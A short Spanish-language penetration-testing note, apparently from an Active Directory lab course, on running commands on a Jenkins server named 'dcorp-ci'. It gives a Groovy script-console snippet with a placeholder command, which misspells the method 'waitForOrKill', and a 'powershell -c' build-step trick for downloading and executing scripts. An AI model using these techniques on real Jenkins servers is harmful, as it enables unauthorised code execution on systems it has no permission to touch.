
## Jenkins 

```bash 
Si hay una versión antigua es porbable que sea una aplicación de empresa vulnerable. El servidor Jenkins es ejecutado en el 'dcorp-ci' por el puerto '8080' 

Aparte de numerosos plugins, hay dos maneras de ejecutar comandos en un 'Jenkins Master'

1. Si se tiene acceso 'Admin' la cual viene instalada en las versiones <2.x 
> http://<jenkins_server>/script 

En la consola, Groovy scripts pueden ser ejecutados 

	def sout = new StringBuffer(), serr = new StringBuffer()
	def proc = '[INSERT COMMAND]'.execute()
	proc.consumeProcessOutput(sout, serr)
	proc.waitForOrkill(1000)
	println "out> $sout err> $serr"


2. Si no se tiene permisos de 'Admin' pero se puede agregar o editar 'build steps' en la configuración. Agregar un 'build step', agregar 'Execute Windows Batch Command' e ingresar:

> powershell -c <command>

Se puede descargar y ejecutar scripts, correr scripts encodeados y más 
```